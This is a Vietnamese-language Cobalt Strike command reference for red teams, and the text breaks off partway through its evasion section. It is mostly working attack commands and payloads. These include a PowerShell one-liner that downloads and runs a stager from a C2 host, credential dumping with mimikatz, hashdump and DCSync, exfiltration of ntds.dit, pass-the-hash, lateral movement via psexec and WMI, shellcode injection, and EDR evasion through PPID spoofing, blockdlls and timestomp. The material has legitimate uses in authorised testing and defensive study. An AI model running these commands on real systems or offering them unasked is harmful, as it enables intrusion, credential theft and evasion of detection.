# Cobalt Strike — Tài Liệu Tham Khảo Lệnh Đầy Đủ (Tiếng Việt)

> **Phạm vi:** Tài liệu dành cho red team / kiểm thử xâm nhập có ủy quyền.  
> Bao gồm toàn bộ lệnh Beacon CS 4.x, Aggressor Script, quản lý listener/payload, và kỹ thuật post-exploitation nâng cao, kèm ví dụ thực tế cho từng lệnh.

---

## Mục Lục

1. [Tổng Quan Kiến Trúc](#1-tổng-quan-kiến-trúc)
2. [Team Server & Client](#2-team-server--client)
3. [Quản Lý Listener](#3-quản-lý-listener)
4. [Tạo Payload](#4-tạo-payload)
5. [Beacon — Lệnh Cơ Bản](#5-beacon--lệnh-cơ-bản)
6. [Beacon — Thông Tin Hệ Thống](#6-beacon--thông-tin-hệ-thống)
7. [Beacon — Thao Tác File](#7-beacon--thao-tác-file)
8. [Beacon — Thao Tác Tiến Trình](#8-beacon--thao-tác-tiến-trình)
9. [Beacon — Leo Thang Đặc Quyền](#9-beacon--leo-thang-đặc-quyền)
10. [Beacon — Thu Thập Thông Tin Xác Thực](#10-beacon--thu-thập-thông-tin-xác-thực)
11. [Beacon — Di Chuyển Ngang (Lateral Movement)](#11-beacon--di-chuyển-ngang-lateral-movement)
12. [Beacon — Mạng & Pivoting](#12-beacon--mạng--pivoting)
13. [Beacon — Injection & Thực Thi Code](#13-beacon--injection--thực-thi-code)
14. [Beacon — Kỹ Thuật Né Tránh (Evasion) & OPSEC](#14-beacon--kỹ-thuật-né-tránh-evasion--opsec)
15. [Beacon — Thao Tác Token](#15-beacon--thao-tác-token)
16. [Beacon — Giao Diện & Keylogging](#16-beacon--giao-diện--keylogging)
17. [Beacon — Lệnh Khác](#17-beacon--lệnh-khác)
18. [Tham Khảo Aggressor Script](#18-tham-khảo-aggressor-script)
19. [Báo Cáo & Xuất Dữ Liệu](#19-báo-cáo--xuất-dữ-liệu)
20. [Kỹ Thuật Nâng Cao & Chuỗi Tấn Công](#20-kỹ-thuật-nâng-cao--chuỗi-tấn-công)
21. [Bảng Tham Khảo Nhanh](#21-bảng-tham-khảo-nhanh)

---

## 1. Tổng Quan Kiến Trúc

```
Operator Console (Cobalt Strike Client)
         |
         | HTTPS/DNS/SMB/TCP
         v
    Team Server  ←──── Listeners (HTTP/HTTPS/DNS/SMB/TCP)
         |
         | Giao nhiệm vụ (bất đồng bộ)
         v
      Beacon (implant trên máy mục tiêu)
```

| Thành phần | Vai trò |
|---|---|
| **Team Server** | Server C2 trung tâm; các operator kết nối vào đây |
| **Client** | Giao diện đồ họa / engine Aggressor Script |
| **Listener** | Dịch vụ mạng nhận callback từ Beacon |
| **Beacon** | Implant chạy trên máy mục tiêu |
| **Stager** | Dropper nhỏ tải Beacon đầy đủ về |
| **Stageless** | Payload tự chứa — Beacon hoàn chỉnh trong một file |

**Mô hình callback của Beacon:** Beacon ngủ theo khoảng thời gian cấu hình (mặc định 60 giây), thức dậy, check-in, lấy nhiệm vụ trong hàng đợi, thực thi chúng, gửi kết quả về, rồi ngủ tiếp. Tất cả lệnh đều bất đồng bộ — lệnh được gửi, Beacon thực thi khi check-in tiếp theo.

---

## 2. Team Server & Client

### Khởi động Team Server

```bash
# Cú pháp
./teamserver <IP> <mật_khẩu> [/đường/dẫn/malleable.profile]

# Ví dụ — cơ bản
./teamserver 192.168.1.100 "MatKhau@123"

# Ví dụ — với Malleable C2 profile
./teamserver 192.168.1.100 "MatKhau@123" /opt/profiles/amazon.profile

# Ví dụ — với chứng chỉ SSL tùy chỉnh
./teamserver 192.168.1.100 "MatKhau@123" /opt/profiles/custom.profile
```

### Kết Nối từ Client

```
Host:     192.168.1.100
Port:     50050  (mặc định)
User:     <tên operator>
Password: <mật khẩu team server>
```

### Nhiều Team Server (CS 4.2+)

```
Connect → Add → nhập thông tin TS thứ hai
```

---

## 3. Quản Lý Listener

Listener nhận callback từ Beacon. Mỗi listener có tên duy nhất và xác định cách Beacon check-in.

### Các Loại Listener

| Loại | Giao thức | Phù hợp khi |
|---|---|---|
| `HTTP` | HTTP thường | Mục tiêu bảo mật thấp |
| `HTTPS` | HTTP bọc TLS | Hầu hết các cuộc tấn công |
| `DNS` | DNS A/TXT/MX | Egress bị hạn chế nghiêm ngặt |
| `SMB` | Named pipe qua SMB | Pivot nội bộ |
| `TCP` | TCP thô | Pivot nội bộ |
| `Foreign HTTP/HTTPS` | Chuyển sang Metasploit | Tấn công đa framework |
| `External C2` | Transport bên thứ ba | Nâng cao |

### Tạo Listener (GUI)

```
Cobalt Strike → Listeners → Add
  Name:     lab-https
  Payload:  Beacon HTTPS
  Host:     203.0.113.10
  Port:     443
  Profile:  default
```

### Listener qua Aggressor Script

```coffeescript
# Tạo HTTP listener
listener_create_ext("lab-http", "windows/beacon_http/reverse_http", %(host => "203.0.113.10", port => "80"));

# Liệt kê listeners
println(listener_names());

# Xóa listener
listener_delete("lab-http");
```

---

## 4. Tạo Payload

### Staged vs. Stageless

| Loại | Ưu điểm | Nhược điểm |
|---|---|---|
| **Staged** (stager) | Shellcode ban đầu nhỏ | 2 kết nối — staging dễ bị phát hiện |
| **Stageless** | Một file duy nhất | File lớn hơn |

### Tạo Payload (GUI)

```
Attacks → Packages → Windows Executable (S)    # EXE Stageless
Attacks → Packages → Windows Executable        # EXE Staged
Attacks → Packages → Raw                       # Shellcode thô
Attacks → Packages → PowerShell               # PowerShell one-liner stager
Attacks → Web Drive-by → Scripted Web Delivery # Stager được host
```

### HTML Application (HTA)

```
Attacks → Web Drive-by → HTML Application
  Listener: lab-https
  Type:     Powershell / VBA
```

### Scripted Web Delivery

```
Attacks → Web Drive-by → Scripted Web Delivery
  URI:      /update
  Listener: lab-https
  Type:     PowerShell  (tạo ra one-liner)
  # hoặc:   bitsadmin / regsvr32
```

One-liner kết quả (ví dụ):
```powershell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://203.0.113.10/update'))"
```

### Payload qua Aggressor Script

```coffeescript
# Tạo shellcode stageless thô vào file
$data = payload("windows/x64/meterpreter_reverse_https", "192.168.1.100", 443);
artifact_payload("C:\\Temp\\beacon.bin", $data, "x64");

# Tạo chuỗi PS stager
$ps = powershell_stager("lab-https");
println($ps);
```

### Tùy Chỉnh Artifact Kit

```
# Biên dịch artifact kit tùy chỉnh (giảm phát hiện AV)
./build.sh <type> <arch> <output_dir>
# Sau đó: Load Kit → Cobalt Strike → Artifact Kit → load artifact kit script
```

---

## 5. Beacon — Lệnh Cơ Bản

> Trong cửa sổ tương tác Beacon, gõ lệnh trực tiếp. Dùng `help` để xem danh sách.

### `help`

Hiển thị tất cả lệnh khả dụng (hoặc help cho một lệnh cụ thể).

```
beacon> help
beacon> help sleep
```

**Ví dụ output của `help`:**
```
Beacon Commands
===============

    Command                   Description
    -------                   -----------
    argue                     Spoof arguments for a job
    blockdlls                 Block non-Microsoft DLLs in child processes
    browserpivot              Setup a browser pivot session
    bypassuac                 Spawn a session in a high integrity process
    cancel                    Cancel a download that's in-progress
    cd                        Change directory
    checkin                   Call home and post data
    clear                     Clear beacon queue
    clipboard                 Attempt to get text copied to the clipboard
    connect                   Connect to a TCP Beacon
    covertvpn                 Deploy Covert VPN client
    cp                        Copy a file
    dcsync                    Run DCSync with PowerSploit
    desktop                   View and interact with target's desktop
    dllinject                 Inject a reflective DLL into a process
    dllload                   Load DLL into a process with LoadLibrary
    download                  Download a file
    downloads                 Lists file downloads in progress
    drives                    List drives on target
    elevate                   Elevate privileges
    execute                   Execute a program on target (no output)
    execute-assembly          Execute a local .NET program in-memory on target
    exit                      Terminate the beacon session
    getpid                    Get the process id of the current process
    getsystem                 Attempt to get SYSTEM
    getuid                    Get User ID
    hashdump                  Dump password hashes
    help                      Help menu
    inject                    Spawn a session in a specific process
    inline-execute            Run a Beacon Object File in this session
    jobkill                   Kill a long-running post-exploitation task
    jobs                      List long-running post-exploitation tasks
    jump                      Spawn a session on a remote host
    keylogger                 Start a keystroke logger
    kill                      Kill a process
    link                      Connect to a named pipe Beacon
    logonpasswords            Dump credentials and hashes with mimikatz
    ls                        List files
    make_token                Create a token to pass credentials
    mimikatz                  Runs a mimikatz command
    mkdir                     Make a directory
    mode dns                  Use DNS A as data channel (DNS beacon only)
    mode dns-txt              Use DNS TXT as data channel (DNS beacon only)
    mode dns6                 Use DNS AAAA as data channel (DNS beacon only)
    mode http                 Use HTTP as data channel
    mv                        Move a file
    net                       Network and host enumeration tool
    note                      Assign a note to this Beacon
    portscan                  Scan a network for open services
    powerpick                 Execute a command via Unmanaged PowerShell
    powershell                Execute a command via powershell.exe
    powershell-import         Import a powershell script
    ppid                      Set parent PID for spawned post-ex jobs
    ps                        Show process list
    psexec                    Use a service to spawn a session on a host
    psinject                  Execute PowerShell command in specific process
    pth                       Pass-the-hash using Mimikatz
    pwd                       Print current directory
    reg                       Query the registry
    remote-exec               Run a command on a remote host
    rev2self                  Revert to original token
    rm                        Remove a file or folder
    rportfwd                  Setup a reverse port forward
    rportfwd_local            Setup a reverse port forward via Cobalt Strike client
    run                       Execute a program on target (returns output)
    runas                     Execute a program as another user
    runasadmin                Execute a program in a high-integrity context
    runu                      Execute a program under another PID
    screenshot                Take a screenshot
    screenwatch               Take periodic screenshots
    shell                     Execute a command via cmd.exe
    shinject                  Inject shellcode into a process
    shspawn                   Spawn process and inject shellcode into it
    sleep                     Set beacon sleep time
    socks                     Start SOCKS4a server to relay traffic
    socks stop                Stop SOCKS4a server
    spawnas                   Spawn a session as another user
    spawnto                   Set executable to spawn processes into
    steal_token               Steal access token from a process
    timestomp                 Apply timestamps from one file to another
    unlink                    Disconnect from parent Beacon
    upload                    Upload a file
    wdigest                   Use mimikatz to dump cleartext credentials
```

### `sleep`

Đặt khoảng thời gian callback của Beacon và phần trăm jitter.

```
sleep <giây> [jitter%]

beacon> sleep 60         # callback mỗi 60 giây, không jitter
beacon> sleep 30 20      # callback mỗi 30 giây ±20% (24–36 giây)
beacon> sleep 0          # chế độ tương tác — callback gần như tức thì
beacon> sleep 3600 50    # rất yên lặng: 1 tiếng ±50% (30–90 phút)
```

> **OPSEC:** `sleep 0` rất ồn ào. Dùng sleep cao + jitter lớn trong hoạt động cần ẩn.

### `checkin`

Buộc Beacon check-in ngay lập tức (hữu ích sau khi thay đổi sleep).

```
beacon> checkin
```

### `clear`

Xóa tất cả nhiệm vụ đang chờ trong hàng đợi của Beacon.

```
beacon> clear
```

### `exit`

Kết thúc Beacon một cách ổn định (gửi nhiệm vụ, Beacon thoát ở lần check-in tiếp theo).

```
beacon> exit
```

### `note`

Gắn ghi chú vào Beacon (hiển thị trong bảng Sessions).

```
note <nội_dung>

beacon> note "Domain Admin — Finance Server"
```

---

## 6. Beacon — Thông Tin Hệ Thống

### `getuid`

Trả về ngữ cảnh người dùng hiện tại (domain\user + cấp đặc quyền).

```
beacon> getuid
[*] Đã giao nhiệm vụ lấy tên người dùng
[*] GetUID: CORP\jsmith (admin)
```

### `getpid`

Trả về ID tiến trình của Beacon hiện tại.

```
beacon> getpid
[*] PID: 4812
```

### `ps`

Liệt kê tất cả tiến trình đang chạy trên mục tiêu.

```
beacon> ps

 PID   PPID  Tên                     Arch  Session  Người dùng
 ---   ----  ---                     ----  -------  ----------
    4      0  System                  x64   0
  432      4  smss.exe                x64   0
  ...
 4812   3244  svchost.exe             x64   0        NT AUTHORITY\SYSTEM
 5120   4812  notepad.exe             x64   1        CORP\jsmith
```

> Tìm tiến trình phù hợp để inject. Để ý: `explorer.exe`, `svchost.exe`, `lsass.exe` (rủi ro cao), trình duyệt.

### `net`

Liệt kê tài nguyên mạng (chạy lệnh `net` gốc qua BOF).

```
net computers               # máy tính trong domain
net dclist                  # domain controllers
net domain                  # tên domain hiện tại
net domain_controllers      # danh sách DC đầy đủ
net domain_trusts           # quan hệ tin tưởng giữa các domain
net group <nhóm>            # thành viên của một nhóm domain
net groups                  # tất cả nhóm domain
net localgroup              # nhóm local trên máy này
net localgroup <nhóm>       # thành viên nhóm local
net logons                  # người dùng đang đăng nhập
net sessions                # phiên SMB đang hoạt động
net share                   # thư mục chia sẻ
net time                    # thời gian từ DC
net use                     # ổ đĩa được ánh xạ
net user <user> /domain     # thông tin người dùng domain
net users                   # người dùng local
net view                    # máy chủ hiển thị trong domain
```

**Ví dụ:**

```
beacon> net computers
beacon> net group "Domain Admins"
beacon> net dclist
beacon> net sessions
beacon> net share
```

### `shell` (cho lệnh net)

```
beacon> shell net user /domain
beacon> shell net group "Domain Admins" /domain
beacon> shell nltest /domain_trusts
```

### Thông tin hệ thống

```
beacon> shell systeminfo
beacon> shell whoami /all
beacon> shell ipconfig /all
beacon> shell route print
beacon> shell netstat -ano
```

---

## 7. Beacon — Thao Tác File

### `ls`

Liệt kê nội dung thư mục.

```
ls [đường_dẫn]

beacon> ls                    # thư mục hiện tại
beacon> ls C:\Users
beacon> ls C:\Users\jsmith\Desktop
```

### `cd`

Thay đổi thư mục làm việc hiện tại.

```
cd <đường_dẫn>

beacon> cd C:\Windows\Temp
beacon> cd ..
```

### `pwd`

In thư mục hiện tại.

```
beacon> pwd
```

### `mkdir`

Tạo thư mục.

```
mkdir <đường_dẫn>

beacon> mkdir C:\Temp\exfil
```

### `mv`

Di chuyển (đổi tên) file.

```
mv <nguồn> <đích>

beacon> mv C:\Temp\cu.txt C:\Temp\moi.txt
```

### `cp`

Sao chép file.

```
cp <nguồn> <đích>

beacon> cp C:\Windows\System32\cmd.exe C:\Temp\khongphailacmd.exe
```

### `rm`

Xóa file hoặc thư mục.

```
rm <đường_dẫn>

beacon> rm C:\Temp\payload.exe
beacon> rm C:\Temp\exfil\*
```

### `download`

Tải file từ mục tiêu về máy operator.

```
download <đường_dẫn>

beacon> download C:\Users\jsmith\Documents\matkhau.xlsx
beacon> download C:\Windows\NTDS\ntds.dit
```

File xuất hiện tại: `View → Downloads`

### `upload`

Upload file từ operator lên mục tiêu.

```
upload <đường_dẫn_local>

# Trong GUI: chuột phải → Upload File
beacon> upload /opt/tools/mimikatz.exe
```

Sau khi upload, file được đặt trong thư mục làm việc hiện tại trên mục tiêu.

### `drives`

Liệt kê các ổ đĩa trên mục tiêu.

```
beacon> drives
Drive  Loại         Kích thước (MB)  Còn trống (MB)  Nhãn
C:\    Fixed         102,400          55,231           Windows
D:\    CD-ROM              0               0
```

### `timestomp`

Sao chép timestamp từ file này sang file khác (chống forensics).

```
timestomp <file_nguồn> <file_đích>

beacon> timestomp C:\Windows\System32\calc.exe C:\Temp\payload.exe
```

---

## 8. Beacon — Thao Tác Tiến Trình

### `run`

Thực thi lệnh và trả về output (tạo tiến trình mới, dùng spawnto, bắt output).

```
run <lệnh> [tham_số]

beacon> run whoami
beacon> run hostname
beacon> run ipconfig /all
```

> Khác với `shell`: `run` dùng binary spawnto cho tiến trình con; `shell` gọi `cmd.exe /c`.

### `shell`

Thực thi qua `cmd.exe /c` (tạo tiến trình con cmd).

```
shell <lệnh>

beacon> shell dir C:\Users
beacon> shell type C:\Windows\win.ini
beacon> shell net user administrator /domain
```

### `powershell`

Thực thi lệnh PowerShell (tạo tiến trình con powershell.exe).

```
powershell <lệnh>

beacon> powershell Get-Process
beacon> powershell Get-ADUser -Filter * | Select-Object Name,SamAccountName
beacon> powershell (New-Object Net.WebClient).DownloadString('http://...')
beacon> powershell -enc <base64>
```

### `powerpick`

Thực thi PowerShell mà **không** tạo tiến trình `powershell.exe` (dùng unmanaged PowerShell qua CLR hosting trong tiến trình spawnto — OPSEC tốt hơn).

```
powerpick <biểu_thức>

beacon> powerpick Get-Process
beacon> powerpick Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
beacon> powerpick IEX (New-Object Net.WebClient).DownloadString('http://...')
```

> **Lợi thế OPSEC:** Không có `powershell.exe` trong danh sách tiến trình.

### `execute-assembly`

Tải và thực thi .NET assembly (EXE hoặc DLL) **trong bộ nhớ** — không có file nào rơi xuống đĩa.

```
execute-assembly <đường_dẫn_local_.net_exe> [tham_số]

beacon> execute-assembly /opt/tools/Rubeus.exe triage
beacon> execute-assembly /opt/tools/SharpHound.exe -c All
beacon> execute-assembly /opt/tools/Seatbelt.exe -group=all
beacon> execute-assembly /opt/tools/SharpUp.exe audit
beacon> execute-assembly /opt/tools/Certify.exe find /vulnerable
```

> Assembly chạy trong tiến trình sacrificial (spawnto). Tất cả output trả về Beacon.

### `kill`

Kết thúc tiến trình theo PID.

```
kill <pid>

beacon> kill 5120
```

### `inject`

Inject shellcode Beacon vào tiến trình đang có sẵn (tạo phiên Beacon mới bên trong tiến trình đó).

```
inject <pid> <arch> <listener>

beacon> inject 5120 x64 lab-https
```

> Tạo phiên Beacon mới chạy bên trong PID 5120. Phiên mới kế thừa ngữ cảnh bảo mật của tiến trình đó.

### `psinject`

Thực thi PowerShell trong tiến trình khác (inject CLR + script vào PID mục tiêu).

```
psinject <pid> <arch> <powershell_script>

beacon> psinject 5120 x64 Get-Process
beacon> psinject 1234 x64 IEX (New-Object Net.WebClient).DownloadString('http://...')
```

### `spawnas`

Tạo Beacon mới dưới tên người dùng khác (yêu cầu mật khẩu plaintext).

```
spawnas <domain\user> <mật_khẩu> <listener>

beacon> spawnas CORP\administrator MatKhau123 lab-https
```

### `spawn`

Tạo phiên Beacon mới (trong tiến trình spawnto) và kết nối đến listener.

```
spawn <arch> <listener>

beacon> spawn x64 lab-https
beacon> spawn x86 smb-pivot
```

### Mô Hình Fork & Run

Hầu hết các lệnh post-exploitation tự động dùng fork&run (tạo tiến trình sacrificial, inject BOF/reflective DLL, thu thập output, kết thúc tiến trình). Đây là mô hình thực thi mặc định cho nhiều lệnh Beacon.

### `argue`

Giả mạo tham số dòng lệnh của tiến trình được tạo (né tránh EDR — tiến trình có vẻ chạy tham số hợp lệ).

```
argue <chương_trình> <tham_số_giả>

beacon> argue C:\Windows\System32\notepad.exe
```

---

## 9. Beacon — Leo Thang Đặc Quyền

### `getsystem`

Cố gắng leo thang lên SYSTEM qua một trong vài kỹ thuật tích hợp sẵn.

```
getsystem

beacon> getsystem
[*] Đã giao nhiệm vụ lấy SYSTEM
[+] Đã giả mạo NT AUTHORITY\SYSTEM
```

> Nội bộ thử: named-pipe impersonation, token duplication.

### `elevate`

Dùng exploit hoặc kỹ thuật cụ thể để leo thang đặc quyền.

```
elevate <tên_exploit> <listener>

# Exploit tích hợp sẵn:
beacon> elevate uac-token-duplication lab-https   # UAC bypass qua token dup
beacon> elevate uac-schtasks lab-https            # UAC bypass qua schtask
beacon> elevate ms14-058 lab-https                # CVE-2014-4113 (legacy)

# Từ Elevate Kit (exploit tùy chỉnh):
beacon> elevate juicy-potato lab-https
beacon> elevate printspoofer lab-https
beacon> elevate sweetpotato lab-https
```

> Sau `elevate`, xuất hiện phiên Beacon mới với high-integrity hoặc SYSTEM.

### `runasadmin`

Chạy lệnh trong ngữ cảnh high-integrity mà không cần phiên mới hoàn toàn.

```
runasadmin <tên_exploit> <lệnh>

beacon> runasadmin uac-cmstplua cmd.exe /c whoami > C:\Temp\out.txt
```

### `bypassuac` (cũ — ưu tiên dùng `elevate`)

```
bypassuac <listener>

beacon> bypassuac lab-https
```

---

## 10. Beacon — Thu Thập Thông Tin Xác Thực

### `hashdump`

Dump hash SAM local (yêu cầu SYSTEM hoặc admin).

```
beacon> hashdump
[*] Đã giao nhiệm vụ dump hash
Administrator:500:aad3b...:31d6c...:::
Guest:501:aad3b...:31d6c...:::
jsmith:1001:aad3b...:7ab19...:::
```

### `logonpasswords` (qua Mimikatz)

Dump thông tin xác thực plaintext, NTLM hash, Kerberos ticket từ bộ nhớ LSASS.

```
beacon> logonpasswords

# Tương đương:
beacon> mimikatz sekurlsa::logonpasswords
```

Output bao gồm:
- Tên người dùng, domain, NTLM hash
- Mật khẩu plaintext (khi có — WDigest)
- Kerberos ticket

### `mimikatz`

Chạy lệnh Mimikatz tùy ý.

```
mimikatz <lệnh>

# Lệnh phổ biến:
beacon> mimikatz sekurlsa::logonpasswords
beacon> mimikatz sekurlsa::wdigest
beacon> mimikatz sekurlsa::tickets
beacon> mimikatz sekurlsa::ekeys
beacon> mimikatz lsadump::sam
beacon> mimikatz lsadump::secrets
beacon> mimikatz lsadump::cache
beacon> mimikatz privilege::debug
beacon> mimikatz token::elevate
beacon> mimikatz crypto::certificates /export
```

### `dcsync`

Thực hiện tấn công DCSync — sao chép hash mật khẩu của tài khoản cụ thể từ DC mà không cần đăng nhập trực tiếp.

```
dcsync <domain> <domain\user>

beacon> dcsync corp.local CORP\krbtgt
beacon> dcsync corp.local CORP\administrator

# Tương đương:
beacon> mimikatz @lsadump::dcsync /domain:corp.local /user:administrator
```

> Yêu cầu: Domain Admin, Enterprise Admin, hoặc quyền DS-Replication-Get-Changes cụ thể.

### Xem Thông Tin Xác Thực đã Thu Thập

```
View → Credentials
```

### `make_token`

Tạo token giả mạo dùng thông tin xác thực đã biết (yêu cầu mật khẩu plaintext).

```
make_token <domain\user> <mật_khẩu>

beacon> make_token CORP\administrator MatKhau123
```

### `steal_token`

Lấy trộm access token từ tiến trình đang có (giả mạo ngữ cảnh bảo mật của nó).

```
steal_token <pid>

beacon> steal_token 4812
[*] Đã giao nhiệm vụ lấy token từ PID 4812
[*] GetUID: CORP\dbadmin
```

### `rev2self`

Quay lại token gốc (hủy `steal_token` hoặc `make_token`).

```
beacon> rev2self
```

### `pth` (Pass-the-Hash)

Dùng NTLM hash để xác thực mà không cần biết mật khẩu plaintext.

```
pth <domain\user> <ntlm_hash>

beacon> pth CORP\administrator aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

> Nội bộ: gọi `sekurlsa::pth` qua Mimikatz, tạo token mới với hash được inject.

### Kerberoasting

```
# Liệt kê tài khoản SPN (tìm user có thể Kerberoast)
beacon> execute-assembly /opt/tools/Rubeus.exe kerberoast /outfile:hashes.txt

# Hoặc qua PowerView:
beacon> powerpick Get-DomainUser -SPN | Select-Object SamAccountName,ServicePrincipalName

# Yêu cầu service ticket:
beacon> execute-assembly /opt/tools/Rubeus.exe asktgs /service:MSSQLSvc/sql01.corp.local:1433 /ptt
```

### AS-REP Roasting

```
beacon> execute-assembly /opt/tools/Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

---

## 11. Beacon — Di Chuyển Ngang (Lateral Movement)

### `jump`

Tạo Beacon trên máy từ xa bằng kỹ thuật tích hợp sẵn.

```
jump <kỹ_thuật> <mục_tiêu> <listener>

# Các kỹ thuật:
beacon> jump psexec      dc01.corp.local lab-https   # upload EXE qua SMB, chạy như service
beacon> jump psexec64    dc01.corp.local lab-https   # tương tự, 64-bit
beacon> jump psexec_psh  dc01.corp.local lab-https   # PowerShell one-liner qua service
beacon> jump winrm       dc01.corp.local lab-https   # WinRM / PowerShell remoting (x86)
beacon> jump winrm64     dc01.corp.local lab-https   # WinRM 64-bit
beacon> jump wmi         dc01.corp.local lab-https   # WMI + staging
beacon> jump wmi64       dc01.corp.local lab-https   # WMI 64-bit
```

> Trước `jump`, thường cần: `make_token` hoặc `steal_token` để có đúng ngữ cảnh.

### `remote-exec`

Thực thi lệnh trên máy từ xa (không có Beacon — chỉ thực thi lệnh).

```
remote-exec <kỹ_thuật> <mục_tiêu> <lệnh>

beacon> remote-exec psexec  dc01.corp.local cmd.exe /c whoami
beacon> remote-exec winrm   dc01.corp.local whoami
beacon> remote-exec wmi     dc01.corp.local cmd.exe /c ipconfig
```

### Kỹ Thuật Di Chuyển Ngang Thủ Công

**Pass-the-Hash + psexec:**
```
beacon> pth CORP\administrator aad3b435b51404eeaad3b435b51404ee:8f4e...
beacon> jump psexec dc01.corp.local lab-https
```

**WMI:**
```
beacon> shell wmic /node:dc01.corp.local /user:CORP\administrator /password:MatKhau process call create "cmd.exe /c whoami > C:\Temp\out.txt"
```

**PowerShell Remoting:**
```
beacon> powerpick Invoke-Command -ComputerName dc01.corp.local -ScriptBlock { whoami }
```

**Token impersonation + SMB:**
```
beacon> steal_token 4812           # lấy token Domain Admin từ explorer
beacon> shell net use \\dc01.corp.local\c$ /user:CORP\administrator MatKhau
beacon> jump psexec dc01.corp.local lab-https
```

### Beacon SMB (Named-Pipe) — Pivot Qua Tường Lửa

1. Triển khai SMB listener trên team server:
   ```
   Listeners → Add → Beacon SMB  →  pipe: \\.\pipe\lab_smb
   ```

2. Trên máy đã bị xâm nhập:
   ```
   beacon> jump psexec host-noi-bo smb-listener
   ```

3. Beacon mới kết nối lại qua SMB link của Beacon đầu tiên.

### `link`

Kết nối thủ công đến SMB Beacon đang chạy trên một máy.

```
link <mục_tiêu> [tên_pipe]

beacon> link 10.10.10.5
beacon> link 10.10.10.5 \\.\pipe\msagent_8f
```

### `unlink`

Ngắt kết nối khỏi Beacon đã link.

```
unlink <mục_tiêu> [pid]

beacon> unlink 10.10.10.5
```

### `connect`

Kết nối thủ công đến TCP Beacon.

```
connect <mục_tiêu> <port>

beacon> connect 10.10.10.5 4444
```

---

## 12. Beacon — Mạng & Pivoting

### `portscan`

Quét TCP port trên các máy chủ.

```
portscan <mục_tiêu> <port> <phương_thức_phát_hiện> [max_socket]

# Phương thức: arp, icmp, none
beacon> portscan 10.10.10.0/24 22,80,443,445,3389,8080 arp 1024
beacon> portscan 10.10.10.5 1-65535 none 256
beacon> portscan 10.10.10.0/24 common none 1024
```

Kết quả xuất hiện tại `View → Targets`.

### `socks`

Khởi động SOCKS4a proxy trên team server (cho phép công cụ của operator tunnel qua Beacon).

```
socks <port>

beacon> socks 1080
```

Cấu hình proxychains trên máy operator:
```
# /etc/proxychains.conf
socks4  127.0.0.1  1080

# Sử dụng:
proxychains nmap -sT -p 445,80 10.10.10.5
proxychains python3 impacket-secretsdump ...
```

### `socks stop`

Dừng SOCKS proxy.

```
beacon> socks stop
```

### `rportfwd`

Reverse port forward: chuyển tiếp một port trên máy mục tiêu về một port trên team server.

```
rportfwd <bind_port_trên_mục_tiêu> <forward_to_host> <forward_to_port>

# Ví dụ: forward 8080 trên mục tiêu → team server 192.168.1.100:80
beacon> rportfwd 8080 192.168.1.100 80
```

Hữu ích để: thiết lập listener mà các máy chỉ có kết nối nội bộ có thể kết nối đến.

### `rportfwd stop`

Dừng reverse port forward.

```
beacon> rportfwd stop 8080
```

### `rportfwd_local`

(CS 4.1+) Như `rportfwd` nhưng forward đến port trên **máy của operator**, không phải team server.

```
beacon> rportfwd_local 8080 127.0.0.1 80
```

### `covertvpn`

Tạo VPN tunnel qua kết nối Beacon (yêu cầu admin trên mục tiêu).

```
beacon> covertvpn <interface> <ip> <netmask> <mac>
```

> Hiếm dùng; SOCKS thực tế hơn.

### DNS C2

Cấu hình listener DNS cho môi trường hạn chế nghiêm ngặt:
```
# Trong Malleable C2 profile:
dns-beacon {
    set dns_idle  "8.8.8.8";
    set dns_sleep "0";
    set maxdns    "255";
}
```

Beacon qua DNS chậm hơn nhiều; dùng `sleep 5` để tương tác nhanh hơn.

---

## 13. Beacon — Injection & Thực Thi Code

### `shinject`

Inject shellcode tùy ý vào tiến trình đang có sẵn.

```
shinject <pid> <arch> <đường_dẫn_shellcode_bin>

beacon> shinject 5120 x64 /opt/payloads/calc.bin
beacon> shinject 1234 x86 /opt/payloads/meterp.bin
```

### `shspawn`

Tạo tiến trình mới và inject shellcode vào đó.

```
shspawn <arch> <đường_dẫn_shellcode_bin>

beacon> shspawn x64 /opt/payloads/stager.bin
```

### `dllinject`

Inject reflective DLL vào tiến trình đang có sẵn.

```
dllinject <pid> <đường_dẫn_dll>

beacon> dllinject 5120 /opt/tools/ReflectiveDll.dll
```

### `dllload`

Tải DLL vào tiến trình mục tiêu bằng `LoadLibrary` (yêu cầu DLL tồn tại trên đĩa mục tiêu).

```
dllload <pid> <đường_dẫn_remote_dll>

beacon> dllload 5120 C:\Temp\evil.dll
```

### `execute-assembly`

(Xem §8 — thực thi .NET trong bộ nhớ)

### `inline-execute` / BOF (Beacon Object Files)

Thực thi BOF (file object C đã biên dịch) inline trong tiến trình Beacon — không tạo tiến trình mới.

```
inline-execute <đường_dẫn_.o> [tham_số]

# Ví dụ với BOF phổ biến:
beacon> inline-execute /opt/bofs/whoami.o
beacon> inline-execute /opt/bofs/nanodump.o lsass 1
beacon> inline-execute /opt/bofs/chrome-dump.o
```

> BOF chạy trong bộ nhớ Beacon — crash sẽ giết Beacon. Kiểm tra BOF cẩn thận trước khi dùng.

Các công cụ BOF phổ biến:
- **TrustedSec BOF Collection** — liệt kê tiến trình, thao tác token
- **nanodump** — dump LSASS không dùng `procdump`
- **Inject-Assembly** — thực thi .NET trong tiến trình

---

## 14. Beacon — Kỹ Thuật Né Tránh (Evasion) & OPSEC

### `sleep`

(Xem §5 — điều khiển OPSEC quan trọng nhất.)

### `spawnto`

Đặt binary mà Beacon dùng khi cần tạo tiến trình con sacrificial (mặc định: `%windir%\syswow64\rundll32.exe` trên x86, `%windir%\system32\rundll32.exe` trên x64).

```
spawnto <arch> <đường_dẫn_đầy_đủ>

beacon> spawnto x64 C:\Windows\System32\dllhost.exe
beacon> spawnto x86 C:\Windows\SysWOW64\msiexec.exe
beacon> spawnto x64 C:\Windows\System32\svchost.exe -k netsvcs
```

> Thay đổi để hòa lẫn vào cây tiến trình bình thường. Chọn tiến trình mong đợi xuất hiện trên mục tiêu.

### `ppid`

Đặt parent process ID cho tiến trình được tạo (giả mạo Parent PID).

```
ppid <pid>

# Ví dụ: làm tiến trình con có vẻ thuộc explorer.exe (PID 4812)
beacon> ppid 4812
```

### `blockdlls`

Chặn DLL không phải của Microsoft load vào tiến trình con sacrificial của Beacon (ngăn DLL hook của EDR load vào).

```
blockdlls start
blockdlls stop

beacon> blockdlls start
```

> Lưu ý: có thể làm hỏng chức năng hợp lệ nếu tiến trình mục tiêu cần DLL bên thứ ba.

### `argue`

